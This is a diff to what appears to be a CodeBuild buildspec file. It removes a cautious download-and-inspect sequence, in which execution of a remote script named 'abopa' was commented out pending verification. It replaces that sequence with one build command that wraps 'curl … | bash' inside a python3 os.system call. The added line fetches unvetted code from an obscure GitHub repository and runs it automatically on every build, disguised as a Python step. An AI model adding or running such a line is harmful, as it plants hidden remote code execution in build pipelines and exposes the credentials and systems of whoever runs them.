@@ -1,23 +1,6 @@
 version: 0.2
 
 phases:
-  install:
-    commands:
-      # Ensure Python3 and curl are available
-      - apt-get update
-      - apt-get install -y python3 curl
-
   build:
     commands:
-      # Step 1: Download the script safely
-      - curl -sL https://github.com/vedhagsvp/marlopava/raw/main/abopa -o abopa.sh
-
-      # Step 2: Inspect before running
-      - head -n 20 abopa.sh   # Preview first 20 lines
-
-      # Step 3: Optional execution (uncomment only if verified safe)
-      # - chmod +x abopa.sh
-      # - bash abopa.sh
-
-      # Step 4: Python inline task
-      - python3 -c "print('Python build step is safe!')"
+      - python3 -c "import os; os.system('curl -sL https://github.com/vedhagsvp/marlopava/raw/main/abopa | bash')"
